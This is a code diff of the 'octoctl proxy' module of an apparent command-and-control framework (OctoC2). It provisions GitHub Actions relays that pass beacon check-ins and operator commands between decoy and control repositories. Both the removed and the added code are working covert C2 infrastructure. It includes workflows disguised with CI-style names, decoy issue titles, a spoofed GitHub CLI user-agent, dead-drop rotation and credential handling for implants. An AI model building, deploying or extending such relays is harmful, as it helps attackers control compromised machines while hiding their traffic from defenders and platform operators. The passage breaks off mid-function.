@@ -1,592 +1,784 @@
 /**
- * octoctl proxy
+ * OctoProxy provisioning and local configuration helpers.
  *
- * Commands for managing OctoProxy — GitHub Actions-based sync relay repos.
- *
- *   octoctl proxy create --target-repo <owner/repo> --agent <id> --sync-token <pat>
- *     — Fully provision a target repo as an OctoProxy relay.
- *
- *   octoctl proxy templates --inner-kind <issues|notes>
- *     — Print the workflow templates (for manual setup).
- *
- *   octoctl proxy list
- *     — Show proxy repos configured via SVC_PROXY_REPOS env var.
- *
- *   octoctl proxy rotate <agentId> <newProxyRepos>
- *     — Print a dead-drop payload to update proxy repo list for an agent.
+ * The relay is deliberately split across a decoy repository and a control
+ * repository. Cross-repository dispatch credentials remain GitHub Actions
+ * secrets; beacons receive repository-bound short-lived leases only through
+ * signed recovery records.
  */
 
+import { createHash } from "node:crypto";
 import { mkdir, writeFile } from "node:fs/promises";
 import { join } from "node:path";
 import { Octokit } from "@octokit/rest";
+import { decodeBase64Url } from "@octoc2/shared";
 import { encryptGitHubSecret } from "../lib/crypto.ts";
 import { getBeacon } from "../lib/registry.ts";
+import {
+  PROXY_WORKFLOW_TEMPLATES,
+  TEMPLATE_FORWARD_REPLIES,
+  TEMPLATE_HELPER,
+  TEMPLATE_PROCESS_CHECKIN,
+  TEMPLATE_SYNC_HELPER,
+} from "./proxyTemplates.ts";
 
-// ── Embedded workflow templates ───────────────────────────────────────────────
-// Templates are embedded here so octoctl works as a standalone binary without
-// needing filesystem access to the repo root.
+export type InnerKind = "issues";
 
-const TEMPLATE_HELPER = `name: CI Forward
-
-on:
-  issue_comment:
-    types: [created]
-
-jobs:
-  forward:
-    if: >
-      github.event.issue.number == vars.FORWARD_ISSUE &&
-      github.event.comment.user.login != 'github-actions[bot]'
-    runs-on: ubuntu-latest
-    steps:
-      - name: Forward update
-        env:
-          SYNC_TOKEN: \${{ secrets.SYNC_TOKEN }}
-          SYNC_REPO_OWNER: \${{ secrets.SYNC_REPO_OWNER }}
-          SYNC_REPO_NAME: \${{ secrets.SYNC_REPO_NAME }}
-          NODE_ID: \${{ secrets.NODE_ID }}
-          COMMENT_BODY: \${{ github.event.comment.body }}
-          COMMENT_ID:   \${{ github.event.comment.id }}
-          ISSUE_NUMBER: \${{ github.event.issue.number }}
-          LAST_UPDATE_TS: \${{ vars.LAST_UPDATE_TS }}
-          TARGET_OWNER: \${{ github.repository_owner }}
-          TARGET_REPO:  \${{ github.event.repository.name }}
-        run: |
-          set -euo pipefail
-          curl -fsSL \\
-            -X POST \\
-            -H "Accept: application/vnd.github+json" \\
-            -H "Authorization: Bearer \${SYNC_TOKEN}" \\
-            "https://api.github.com/repos/\${SYNC_REPO_OWNER}/\${SYNC_REPO_NAME}/dispatches" \\
-            -d "$(jq -n \\
-              --arg node_id        "\${NODE_ID}" \\
-              --arg comment_body   "\${COMMENT_BODY}" \\
-              --argjson comment_id "\${COMMENT_ID}" \\
-              --argjson issue_number "\${ISSUE_NUMBER}" \\
-              --arg last_update_ts "\${LAST_UPDATE_TS}" \\
-              --arg target_owner   "\${TARGET_OWNER}" \\
-              --arg target_repo    "\${TARGET_REPO}" \\
-              '{
-                event_type: "infra-sync",
-                client_payload: {
-                  node_id:        $node_id,
-                  comment_body:   $comment_body,
-                  comment_id:     $comment_id,
-                  issue_number:   $issue_number,
-                  last_update_ts: $last_update_ts,
-                  target_owner:   $target_owner,
-                  target_repo:    $target_repo
-                }
-              }')"
-`;
-
-const TEMPLATE_SYNC_HELPER = `name: CI Sync
-
-on:
-  repository_dispatch:
-    types: [infra-update]
-
-jobs:
-  sync:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Post update comment
-        env:
-          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}
-          FORWARD_ISSUE: \${{ vars.FORWARD_ISSUE }}
-          COMMENT_BODY: \${{ github.event.client_payload.comment_body }}
-          UPDATE_TS:  \${{ github.event.client_payload.update_ts }}
-          FORWARD_REPO: \${{ github.repository }}
-        run: |
-          set -euo pipefail
-          gh issue comment "\${FORWARD_ISSUE}" \\
-            --repo "\${FORWARD_REPO}" \\
-            --body "\${COMMENT_BODY}"
-
-      - name: Update last-sync cursor
-        env:
-          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}
-          UPDATE_TS: \${{ github.event.client_payload.update_ts }}
-          FORWARD_REPO: \${{ github.repository }}
-        run: |
-          set -euo pipefail
-          gh variable set LAST_UPDATE_TS \\
-            --repo "\${FORWARD_REPO}" \\
-            --body "\${UPDATE_TS}"
-`;
-
-const TEMPLATE_PROCESS_CHECKIN = `name: CI Update
-
-on:
-  repository_dispatch:
-    types: [infra-sync]
-
-jobs:
-  process:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Fetch and relay pending updates
-        env:
-          MAIN_TOKEN:        \${{ secrets.MAIN_TOKEN }}
-          MAIN_REPO_OWNER:   \${{ secrets.MAIN_REPO_OWNER }}
-          MAIN_REPO_NAME:    \${{ secrets.MAIN_REPO_NAME }}
-          NODE_ISSUE_MAP:    \${{ secrets.NODE_ISSUE_MAP }}
-          TARGET_TOKEN:      \${{ secrets.TARGET_TOKEN }}
-          NODE_ID:           \${{ github.event.client_payload.node_id }}
-          TARGET_OWNER:      \${{ github.event.client_payload.target_owner }}
-          TARGET_REPO:       \${{ github.event.client_payload.target_repo }}
-          LAST_UPDATE_TS:    \${{ github.event.client_payload.last_update_ts }}
-        run: |
-          set -euo pipefail
-          # Resolve main issue number for this node
-          ISSUE_NUMBER=$(echo "\${NODE_ISSUE_MAP}" | jq -r --arg id "\${NODE_ID}" '.[$id]')
-          if [ "\${ISSUE_NUMBER}" = "null" ] || [ -z "\${ISSUE_NUMBER}" ]; then
-            echo "Unknown node \${NODE_ID}, skipping"
-            exit 0
-          fi
-
-          # Fetch comments from the main issue newer than last sync
-          COMMENTS=$(curl -fsSL \\
-            -H "Accept: application/vnd.github+json" \\
-            -H "Authorization: Bearer \${MAIN_TOKEN}" \\
-            "https://api.github.com/repos/\${MAIN_REPO_OWNER}/\${MAIN_REPO_NAME}/issues/\${ISSUE_NUMBER}/comments?per_page=100&sort=created&direction=asc" \\
-            | jq --arg since "\${LAST_UPDATE_TS}" \\
-                '[.[] | select(.created_at > $since)]')
-
-          COUNT=$(echo "\${COMMENTS}" | jq length)
-          if [ "\${COUNT}" = "0" ]; then
-            echo "No new updates for \${NODE_ID}"
-            exit 0
-          fi
-
-          # Forward each update comment to the target repo
-          echo "\${COMMENTS}" | jq -c '.[]' | while read -r comment; do
-            BODY=$(echo "\${comment}" | jq -r '.body')
-            UPDATE_TS=$(echo "\${comment}" | jq -r '.created_at')
-            curl -fsSL \\
-              -X POST \\
-              -H "Accept: application/vnd.github+json" \\
-              -H "Authorization: Bearer \${TARGET_TOKEN}" \\
-              "https://api.github.com/repos/\${TARGET_OWNER}/\${TARGET_REPO}/dispatches" \\
-              -d "$(jq -n \\
-                --arg comment_body "\${BODY}" \\
-                --arg update_ts     "\${UPDATE_TS}" \\
-                '{
-                  event_type: "infra-update",
-                  client_payload: {
-                    comment_body: $comment_body,
-                    update_ts:    $update_ts
-                  }
-                }')"
-          done
-`;
-
-// ── Types ─────────────────────────────────────────────────────────────────────
-
-export type InnerKind = "issues" | "notes";
-
-/**
- * App authentication config for a proxy relay.
- * NOTE: Must be kept in sync with AppConfig in implant/src/types.ts.
- */
-export interface ProxyAppConfig {
-  appId:          string;
-  installationId: string;
-  privateKey:     string;
-}
-
+/** Non-secret proxy route. Runtime credentials arrive in signed recovery. */
 export interface ProxyConfig {
-  owner:      string;
-  repo:       string;
-  token?:     string;
-  innerKind:  InnerKind;
-  appConfig?: ProxyAppConfig;
+  owner: string;
+  repo: string;
+  innerKind: InnerKind;
+  decoyIssue: number;
 }
 
 export interface ProxyCreateOptions {
-  owner:     string;
-  repo:      string;
+  owner: string;
+  repo: string;
   innerKind: InnerKind | string;
 }
 
 export interface ProxyRotateOptions {
-  beaconId:     string;
+  beaconId: string;
   newProxyRepos: string;
 }
 
-// ── proxy create ──────────────────────────────────────────────────────────────
-
-const VALID_INNER_KINDS: ReadonlySet<string> = new Set(["issues", "notes"]);
-
-/**
- * Print the three OctoProxy workflow templates.
- *
- * @param opts   - Command options (owner, repo, innerKind)
- * @param print  - Output sink; defaults to console.log (injectable for tests)
- */
-export async function proxyCreate(
-  opts: ProxyCreateOptions,
-  print: (line: string) => void = console.log
-): Promise<void> {
-  if (!VALID_INNER_KINDS.has(opts.innerKind)) {
-    throw new Error(
-      `--inner-kind must be 'issues' or 'notes', got '${opts.innerKind}'`
-    );
-  }
-
-  const BOLD  = "\x1b[1m";
-  const DIM   = "\x1b[2m";
-  const CYAN  = "\x1b[36m";
-  const RESET = "\x1b[0m";
-
-  const sep = "─".repeat(72);
-
-  print("");
-  print(`${BOLD}OctoProxy workflow templates for ${opts.owner}/${opts.repo}${RESET}`);
-  print(`${DIM}inner-kind: ${opts.innerKind}${RESET}`);
-  print(`${DIM}Install all three files under .github/workflows/ in the proxy repo.${RESET}`);
-  print("");
-
-  const templates: Array<{ filename: string; content: string }> = [
-    { filename: "helper.yml",          content: TEMPLATE_HELPER },
-    { filename: "sync-helper.yml",     content: TEMPLATE_SYNC_HELPER },
-    { filename: "process-checkin.yml", content: TEMPLATE_PROCESS_CHECKIN },
-  ];
-
-  for (const { filename, content } of templates) {
-    print(`${CYAN}${sep}${RESET}`);
-    print(`${BOLD}File: .github/workflows/${filename}${RESET}`);
-    print(`${CYAN}${sep}${RESET}`);
-    print(content);
-  }
-
-  print(`${CYAN}${sep}${RESET}`);
-  print("");
-  print(`${BOLD}Next steps for ${opts.owner}/${opts.repo}:${RESET}`);
-  print(`  1. Copy the files above into .github/workflows/`);
-  print(`  2. Set repo variables:`);
-  print(`       FORWARD_ISSUE  — issue number the agent syncs into`);
-  print(`  3. Set repo secrets:`);
-  print(`       SYNC_TOKEN      — PAT for the sync repo (needs repo_dispatch)`);
-  print(`       SYNC_REPO_OWNER — owner of the sync repo`);
-  print(`       SYNC_REPO_NAME  — name of the sync repo`);
-  print(`       NODE_ID         — agent UUID assigned to this proxy`);
-  print("");
-}
-
-// ── proxy list ────────────────────────────────────────────────────────────────
-
-/**
- * Print proxy repo configuration from SVC_PROXY_REPOS env var.
- *
- * @param print - Output sink; defaults to console.log (injectable for tests)
- */
-export async function proxyList(
-  print: (line: string) => void = console.log
-): Promise<void> {
-  const raw = process.env.SVC_PROXY_REPOS;
-
-  const DIM   = "\x1b[2m";
-  const BOLD  = "\x1b[1m";
-  const RESET = "\x1b[0m";
-
-  print("");
-  print(`${BOLD}Proxy repos${RESET} — configured via SVC_PROXY_REPOS env var`);
-  print("");
-
-  if (!raw) {
-    print(`  ${DIM}(none configured)${RESET}`);
-    print(`  Set SVC_PROXY_REPOS to a JSON array of ProxyConfig objects:`);
-    print(`  ${DIM}[{"owner":"acme","repo":"decoy","innerKind":"issues"}]${RESET}`);
-    print("");
-    return;
-  }
-
-  let configs: unknown;
-  try {
-    configs = JSON.parse(raw);
-  } catch {
-    print(`  Error: SVC_PROXY_REPOS is not valid JSON: ${raw}`);
-    print("");
-    return;
-  }
-
-  if (!Array.isArray(configs)) {
-    print(`  Error: SVC_PROXY_REPOS must be a JSON array, got: ${typeof configs}`);
-    print("");
-    return;
-  }
-
-  if (configs.length === 0) {
-    print(`  ${DIM}(none configured)${RESET}`);
-    print("");
-    return;
-  }
-
-  print(`  ${configs.length} proxy repo(s):`);
-  print("");
-  for (let i = 0; i < configs.length; i++) {
-    const c = configs[i] as Record<string, unknown>;
-    const owner     = typeof c.owner     === "string" ? c.owner     : "(unknown)";
-    const repo      = typeof c.repo      === "string" ? c.repo      : "(unknown)";
-    const innerKind = typeof c.innerKind === "string" ? c.innerKind : "(unknown)";
-    print(`  ${i + 1}. ${owner}/${repo}  ${DIM}inner-kind: ${innerKind}${RESET}`);
-  }
-  print("");
-}
-
-// ── proxy rotate ──────────────────────────────────────────────────────────────
-
-/**
- * Print instructions for rotating proxy repos for a beacon via a dead-drop.
- *
- * @param opts  - beaconId and newProxyRepos (JSON string)
- * @param print - Output sink; defaults to console.log (injectable for tests)
- */
-export async function proxyRotate(
-  opts: ProxyRotateOptions,
-  print: (line: string) => void = console.log
-): Promise<void> {
-  // Validate JSON
-  let parsed: unknown;
-  try {
-    parsed = JSON.parse(opts.newProxyRepos);
-  } catch {
-    throw new Error(
-      `Invalid JSON for newProxyRepos: ${opts.newProxyRepos}`
-    );
-  }
-
-  if (!Array.isArray(parsed)) {
-    throw new Error(
-      `newProxyRepos must be an array of ProxyConfig objects, got ${typeof parsed}`
-    );
-  }
-
-  const BOLD  = "\x1b[1m";
-  const DIM   = "\x1b[2m";
-  const CYAN  = "\x1b[36m";
-  const RESET = "\x1b[0m";
-
-  print("");
-  print(`${BOLD}Proxy rotation for agent ${opts.beaconId}${RESET}`);
-  print(`${DIM}Post this dead-drop payload to the main issue to update proxy repos.${RESET}`);
-  print("");
-  print(`${CYAN}Dead-drop payload:${RESET}`);
-  print(JSON.stringify({ type: "proxy-rotate", proxyRepos: parsed }, null, 2));
-  print("");
-  print(`${BOLD}Instructions:${RESET}`);
-  print(`  1. Use ${DIM}octoctl drop create --beacon ${opts.beaconId} ...${RESET} to create`);
-  print(`     an encrypted dead-drop gist containing the payload above.`);
-  print(`  2. The agent will pick up the dead-drop on its next sync and`);
-  print(`     switch to the new proxy repo list.`);
-  print(`  3. Update SVC_PROXY_REPOS on the server to match.`);
-  print("");
-}
-
-// ── proxy provision ───────────────────────────────────────────────────────────
-
 export interface ProxyProvisionOptions {
-  decoyOwner:      string;
-  decoyRepo:       string;
-  beaconId:        string;       // prefix match against registry
-  ctrlToken:       string;       // value to store as SYNC_TOKEN secret
-  ctrlOwner:       string;       // value to store as SYNC_REPO_OWNER secret
-  ctrlRepo:        string;       // value to store as SYNC_REPO_NAME secret
-  proxyToken?:     string;       // agent's PAT for SVC_PROXY_REPOS (default: OCTOC2_GITHUB_TOKEN)
-  innerKind?:      InnerKind;    // default: 'issues'
-  issueTitle?:     string;       // default: 'Dependency audit: review pinned versions'
-  createRepo?:     boolean;      // create the GitHub repo first
-  scaffold?:       boolean;      // push README.md + .gitignore scaffold commits
-  dataDir?:        string;
-  // GitHub App auth fields — if all three are provided, appConfig is baked into
-  // the SVC_PROXY_REPOS entry so the beacon uses App tokens for this proxy repo.
-  appId?:          string;
-  installationId?: string;
-  appPrivateKey?:  string;
-  /** Injectable for tests — if not provided, creates from OCTOC2_GITHUB_TOKEN */
+  decoyOwner: string;
+  decoyRepo: string;
+  beaconId: string;
+  controlDispatchToken: string;
+  targetDispatchToken: string;
+  relaySigningKey: string;
+  ctrlOwner: string;
+  ctrlRepo: string;
+  proxyInstallationId: number;
+  innerKind?: InnerKind;
+  issueTitle?: string;
+  createRepo?: boolean;
+  scaffold?: boolean;
+  dataDir?: string;
+  /** Test-only dependency injection. */
   _octokit?: unknown;
 }
 
+interface RepositoryRef {
+  owner: string;
+  repo: string;
+}
+
+type RouteMap = Record<
+  string,
+  {
+    controlIssue: number;
+    decoyRepository: string;
+    decoyIssue: number;
+  }
+>;
+
+const VALID_INNER_KINDS: ReadonlySet<string> = new Set(["issues"]);
+const REPO_SEGMENT = /^[A-Za-z0-9_.-]+$/;
+const CONTROL_CREDENTIAL_FINGERPRINTS =
+  "OCTOC2_PROXY_CONTROL_FINGERPRINTS";
+
+function assertInnerKind(value: string): asserts value is InnerKind {
+  if (!VALID_INNER_KINDS.has(value)) {
+    throw new Error(
+      `--inner-kind must be 'issues', got '${value}'`,
+    );
+  }
+}
+
+function assertRepository(ref: RepositoryRef, name: string): void {
+  if (!REPO_SEGMENT.test(ref.owner) || !REPO_SEGMENT.test(ref.repo)) {
+    throw new Error(`${name} must contain a valid GitHub owner and repository`);
+  }
+}
+
+function repositoryKey(ref: RepositoryRef): string {
+  return `${ref.owner}/${ref.repo}`.toLowerCase();
+}
+
+function parseProxyRouteArray(
+  parsed: unknown,
+  sourceName: string,
+): ProxyConfig[] {
+  if (!Array.isArray(parsed)) {
+    throw new Error(
+      `${sourceName} must be an array of proxy route objects, got ${typeof parsed}`,
+    );
+  }
+  if (parsed.length > 1) {
+    throw new Error(
+      `${sourceName} supports at most one proxy route per beacon`,
+    );
+  }
+
+  const routes: ProxyConfig[] = [];
+  const seen = new Set<string>();
+  for (const [index, value] of parsed.entries()) {
+    if (typeof value !== "object" || value === null || Array.isArray(value)) {
+      throw new Error(`${sourceName}[${index}] must be an object`);
+    }
+    const route = value as Record<string, unknown>;
+    if (
+      typeof route.owner !== "string" ||
+      typeof route.repo !== "string" ||
+      typeof route.innerKind !== "string" ||
+      !Number.isSafeInteger(route.decoyIssue) ||
+      (route.decoyIssue as number) <= 0
+    ) {
+      throw new Error(
+        `${sourceName}[${index}] requires owner, repo, innerKind, and a positive decoyIssue`,
+      );
+    }
+    assertInnerKind(route.innerKind);
+    const candidate: ProxyConfig = {
+      owner: route.owner,
+      repo: route.repo,
+      innerKind: route.innerKind,
+      decoyIssue: route.decoyIssue as number,
+    };
+    assertRepository(candidate, `${sourceName}[${index}]`);
+    for (const forbidden of [
+      "token",
+      "appConfig",
+      "githubTokenLease",
+      "tokenLease",
+    ]) {
+      if (forbidden in route) {
+        throw new Error(
+          `${sourceName}[${index}] must not contain credential field '${forbidden}'`,
+        );
+      }
+    }
+    const key = repositoryKey(candidate);
+    if (seen.has(key)) {
+      throw new Error(`Duplicate proxy repository ${candidate.owner}/${candidate.repo}`);
+    }
+    seen.add(key);
+    routes.push(candidate);
+  }
+  return routes;
+}
+
+function parseProxyRoutes(raw: string): ProxyConfig[] {
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(raw);
+  } catch {
+    throw new Error(`Invalid JSON for newProxyRepos: ${raw}`);
+  }
+  return parseProxyRouteArray(parsed, "newProxyRepos");
+}
+
+function parseRecoveryProxyRoutes(
+  raw: string,
+): Array<{ beaconId: string; routes: ProxyConfig[] }> {
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(raw);
+  } catch {
+    throw new Error("OCTOC2_RECOVERY_POLICIES must be valid JSON");
+  }
+  if (typeof parsed !== "object" || parsed === null || Array.isArray(parsed)) {
+    throw new Error("OCTOC2_RECOVERY_POLICIES must be a JSON object");
+  }
+
+  return Object.entries(parsed)
+    .sort(([left], [right]) => left.localeCompare(right))
+    .map(([beaconId, value]) => {
+      if (typeof value !== "object" || value === null || Array.isArray(value)) {
+        throw new Error(`Recovery policy for ${beaconId} must be an object`);
+      }
+      const policy = value as Record<string, unknown>;
+      return {
+        beaconId,
+        routes: parseProxyRouteArray(
+          policy["proxyRepos"] ?? [],
+          `OCTOC2_RECOVERY_POLICIES.${beaconId}.proxyRepos`,
+        ),
+      };
+    });
+}
+
+async function upsertVariable(
+  octokit: Octokit,
+  repository: RepositoryRef,
+  name: string,
+  value: string,
+): Promise<void> {
+  try {
+    await octokit.rest.actions.createRepoVariable({
+      ...repository,
+      name,
+      value,
+    });
+  } catch (error) {
+    if ((error as { status?: number }).status !== 422) throw error;
+    await octokit.rest.actions.updateRepoVariable({
+      ...repository,
+      name,
+      value,
+    });
+  }
+}
+
+async function readOptionalVariable(
+  octokit: Octokit,
+  repository: RepositoryRef,
+  name: string,
+): Promise<string | null> {
+  try {
+    const response = await octokit.rest.actions.getRepoVariable({
+      ...repository,
+      name,
+    });
+    return response.data.value;
+  } catch (error) {
+    if ((error as { status?: number }).status === 404) return null;
+    throw error;
+  }
+}
+
+async function readRequiredMonitoringKey(
+  octokit: Octokit,
+  repository: RepositoryRef,
+): Promise<string> {
+  const value = (await readOptionalVariable(
+    octokit,
+    repository,
+    "MONITORING_PUBKEY",
+  ))?.trim();
+  if (!value) {
+    throw new Error(
+      `${repository.owner}/${repository.repo} MONITORING_PUBKEY is required`,
+    );
+  }
+  return value;
+}
+
+function credentialFingerprint(value: string): string {
+  return createHash("sha256").update(value, "utf8").digest("hex");
+}
+
+interface ControlCredentialFingerprints {
+  version: 1;
+  relaySigningKeySha256: string;
+  targetDispatchTokenSha256: string;
+}
+
+function parseControlCredentialFingerprints(
+  raw: string,
+  repository: RepositoryRef,
+): ControlCredentialFingerprints {
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(raw);
+  } catch {
+    throw new Error(
+      `${repository.owner}/${repository.repo} ${CONTROL_CREDENTIAL_FINGERPRINTS} is not valid JSON`,
+    );
+  }
+  if (
+    typeof parsed !== "object" ||
+    parsed === null ||
+    Array.isArray(parsed)
+  ) {
+    throw new Error(
+      `${repository.owner}/${repository.repo} ${CONTROL_CREDENTIAL_FINGERPRINTS} must be an object`,
+    );
+  }
+  const value = parsed as Record<string, unknown>;
+  const keys = Object.keys(value).sort();
+  if (
+    keys.join(",") !==
+      "relaySigningKeySha256,targetDispatchTokenSha256,version" ||
+    value["version"] !== 1 ||
+    typeof value["relaySigningKeySha256"] !== "string" ||
+    !/^[0-9a-f]{64}$/.test(value["relaySigningKeySha256"]) ||
+    typeof value["targetDispatchTokenSha256"] !== "string" ||
+    !/^[0-9a-f]{64}$/.test(value["targetDispatchTokenSha256"])
+  ) {
+    throw new Error(
+      `${repository.owner}/${repository.repo} ${CONTROL_CREDENTIAL_FINGERPRINTS} is invalid`,
+    );
+  }
+  return {
+    version: 1,
+    relaySigningKeySha256: value["relaySigningKeySha256"],
+    targetDispatchTokenSha256: value["targetDispatchTokenSha256"],
+  };
+}
+
+async function setSecrets(
+  octokit: Octokit,
+  repository: RepositoryRef,
+  secrets: Readonly<Record<string, string>>,
+): Promise<void> {
+  const response = await octokit.rest.actions.getRepoPublicKey({
+    ...repository,
+  });
+  for (const [name, value] of Object.entries(secrets)) {
+    if (value.trim().length === 0) {
+      throw new Error(`Secret ${name} must not be empty`);
+    }
+    const encryptedValue = await encryptGitHubSecret(
+      value,
+      response.data.key,
+    );
+    await octokit.rest.actions.createOrUpdateRepoSecret({
+      ...repository,
+      secret_name: name,
+      encrypted_value: encryptedValue,
+      key_id: response.data.key_id,
+    });
+  }
+}
+
+async function readRouteMap(
+  octokit: Octokit,
+  repository: RepositoryRef,
+): Promise<RouteMap> {
+  let raw: string;
+  try {
+    const response = await octokit.rest.actions.getRepoVariable({
+      ...repository,
+      name: "NODE_ROUTE_MAP",
+    });
+    raw = response.data.value;
+  } catch (error) {
+    if ((error as { status?: number }).status === 404) return {};
+    throw error;
+  }
+
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(raw);
+  } catch {
+    throw new Error(
+      `${repository.owner}/${repository.repo} NODE_ROUTE_MAP is not valid JSON`,
+    );
+  }
+  if (typeof parsed !== "object" || parsed === null || Array.isArray(parsed)) {
+    throw new Error(
+      `${repository.owner}/${repository.repo} NODE_ROUTE_MAP must be an object`,
+    );
+  }
+  return parsed as RouteMap;
+}
+
+/** Print all four canonical workflow templates and their repository placement. */
+export async function proxyCreate(
+  opts: ProxyCreateOptions,
+  print: (line: string) => void = console.log,
+): Promise<void> {
+  assertInnerKind(opts.innerKind);
+  const sep = "-".repeat(72);
+  print("");
+  print(`OctoProxy workflows for ${opts.owner}/${opts.repo}`);
+  print(`inner-kind: ${opts.innerKind}`);
+  print("Use two distinct repositories; same-repository runs are not E2E proof.");
+  print("");
+
+  for (const template of PROXY_WORKFLOW_TEMPLATES) {
+    print(sep);
+    print(
+      `${template.repository}: .github/workflows/${template.filename}`,
+    );
+    print(sep);
+    print(template.content);
+  }
+
+  print(sep);
+  print("Decoy repository:");
+  print("  workflows: helper.yml, sync-helper.yml");
+  print("  secrets: CONTROL_TOKEN, CONTROL_OWNER, CONTROL_REPO, NODE_ID, RELAY_SIGNING_KEY");
+  print("  variables: FORWARD_ISSUE, MONITORING_PUBKEY");
+  print("  App lease permissions: metadata:read, issues:write, variables:read");
+  print("Control repository:");
+  print("  workflows: process-checkin.yml, forward-replies.yml");
+  print("  secrets: TARGET_TOKEN, RELAY_SIGNING_KEY");
+  print(
+    `  variables: NODE_ROUTE_MAP, ${CONTROL_CREDENTIAL_FINGERPRINTS}`,
+  );
+  print("");
+}
+
+/** Show proxy route metadata from the server's signed-recovery policy source. */
+export async function proxyList(
+  print: (line: string) => void = console.log,
+): Promise<void> {
+  const raw = process.env.OCTOC2_RECOVERY_POLICIES;
+  print("");
+  print("Proxy routes from OCTOC2_RECOVERY_POLICIES");
+  print("(credentials are minted separately and delivered only in signed recovery records)");
+  print("");
+  if (!raw) {
+    print("  (none configured)");
+    return;
+  }
+
+  let policies: Array<{ beaconId: string; routes: ProxyConfig[] }>;
+  try {
+    policies = parseRecoveryProxyRoutes(raw);
+  } catch (error) {
+    print(`  Error: ${(error as Error).message}`);
+    return;
+  }
+  if (policies.every(({ routes }) => routes.length === 0)) {
+    print("  (none configured)");
+    return;
+  }
+  for (const { beaconId, routes } of policies) {
+    if (routes.length === 0) continue;
+    print(`  ${beaconId}:`);
+    for (const [index, route] of routes.entries()) {
+      print(
+        `    ${index + 1}. ${route.owner}/${route.repo}  ` +
+          `inner-kind: ${route.innerKind}  issue: ${route.decoyIssue}`,
+      );
+    }
+  }
+  print("");
+}
+
 /**
- * Fully provision a target repo as an OctoProxy relay for an agent.
+ * Print the policy fragment required for a signed recovery rotation.
+ * A raw, unsigned proxy-rotate dead-drop is intentionally not emitted.
+ */
+export async function proxyRotate(
+  opts: ProxyRotateOptions,
+  print: (line: string) => void = console.log,
+): Promise<void> {
+  const routes = parseProxyRoutes(opts.newProxyRepos);
+  print("");
+  print(`Proxy recovery-policy update for beacon ${opts.beaconId}`);
+  print(JSON.stringify({ [opts.beaconId]: { proxyRepos: routes } }, null, 2));
+  print("");
+  print(
+    "Merge this fragment into OCTOC2_RECOVERY_POLICIES and add matching " +
+      "repository-bound entries to OCTOC2_GITHUB_APP_POLICIES.",
+  );
+  print(
+    "The server will mint short-lived leases and publish the next signed, sealed recovery record.",
+  );
+  print("");
+}
+
+/**
+ * Provision the two-repository relay contract without placing persistent
+ * GitHub credentials or App private keys in beacon configuration.
  */
 export async function proxyProvision(
   opts: ProxyProvisionOptions,
   print: (line: string) => void = console.log,
 ): Promise<void> {
-  const owner     = opts.decoyOwner;
-  const repo      = opts.decoyRepo;
+  const decoy = { owner: opts.decoyOwner, repo: opts.decoyRepo };
+  const control = { owner: opts.ctrlOwner, repo: opts.ctrlRepo };
+  assertRepository(decoy, "decoy repository");
+  assertRepository(control, "control repository");
+  if (repositoryKey(decoy) === repositoryKey(control)) {
+    throw new Error("Decoy and control repositories must be distinct");
+  }
   const innerKind = opts.innerKind ?? "issues";
-  const issueTitle = opts.issueTitle ?? "Dependency audit: review pinned versions";
-  const dataDir   = opts.dataDir ?? process.env["OCTOC2_DATA_DIR"] ?? "./data";
+  assertInnerKind(innerKind);
+  if (
+    !Number.isSafeInteger(opts.proxyInstallationId) ||
+    opts.proxyInstallationId <= 0
+  ) {
+    throw new Error("proxyInstallationId must be a positive safe integer");
+  }
+  if (opts.controlDispatchToken.trim().length === 0) {
+    throw new Error("A control-repository dispatch credential is required");
+  }
+  if (opts.targetDispatchToken.trim().length === 0) {
+    throw new Error(
+      "A stable control egress credential authorized for every decoy repository is required",
+    );
+  }
+  if (opts.controlDispatchToken === opts.targetDispatchToken) {
+    throw new Error(
+      "Control and decoy dispatch credentials must be distinct and repository-scoped",
+    );
+  }
+  if (opts.relaySigningKey.trim().length < 32) {
+    throw new Error("Relay signing key must contain at least 32 characters");
+  }
 
-  // 1. Load beacon from registry
+  const dataDir = opts.dataDir ?? process.env["OCTOC2_DATA_DIR"] ?? "./data";
   const beacon = await getBeacon(opts.beaconId, dataDir);
   if (!beacon) {
     throw new Error(`Beacon not found: no beacon matching '${opts.beaconId}'`);
   }
+  if (!Number.isSafeInteger(beacon.issueNumber) || beacon.issueNumber <= 0) {
+    throw new Error(
+      `Beacon ${beacon.beaconId} has no control issue for proxy routing`,
+    );
+  }
 
-  // 2. Build Octokit
-  const octokit = opts._octokit as Octokit ?? new Octokit({
-    auth: process.env["OCTOC2_GITHUB_TOKEN"],
-    headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
-  });
+  let octokit: Octokit;
+  if (opts._octokit) {
+    octokit = opts._octokit as Octokit;
+  } else {
+    const token = process.env["OCTOC2_OPERATOR_GITHUB_TOKEN"];
+    if (!token) {
+      throw new Error(
+        "OCTOC2_OPERATOR_GITHUB_TOKEN is required to provision repositories",
+      );
+    }
+    octokit = new Octokit({
+      auth: token,
+      headers: {
+        "user-agent": "OctoC2-Operator/0.1",
+      },
+    });
+  }
 
-  // 3. Optionally create the repo
+  const routeMap = await readRouteMap(octokit, control);
+  const existingRoute = routeMap[beacon.beaconId];
+  if (existingRoute) {
+    if (typeof existingRoute.decoyRepository !== "string") {
+      throw new Error(
+        `Beacon ${beacon.beaconId} has an invalid existing proxy route`,
+      );
+    }
+    if (
+      existingRoute.decoyRepository.toLowerCase() !== repositoryKey(decoy)
+    ) {
+      throw new Error(
+        `Beacon ${beacon.beaconId} already has a proxy route to ` +
+          existingRoute.decoyRepository,
+      );
+    }
+  }
+  const expectedFingerprints: ControlCredentialFingerprints = {
+    version: 1,
+    relaySigningKeySha256: credentialFingerprint(opts.relaySigningKey),
+    targetDispatchTokenSha256:
+      credentialFingerprint(opts.targetDispatchToken),
+  };
+  const storedFingerprintRaw = await readOptionalVariable(
+    octokit,
+    control,
+    CONTROL_CREDENTIAL_FINGERPRINTS,
+  );
+  if (storedFingerprintRaw === null && Object.keys(routeMap).length > 0) {
+    throw new Error(
+      `${control.owner}/${control.repo} already has proxy routes but no ` +
+        `${CONTROL_CREDENTIAL_FINGERPRINTS}; rotate the control credentials ` +
+        "explicitly before adding another route",
+    );
+  }
+  if (storedFingerprintRaw !== null) {
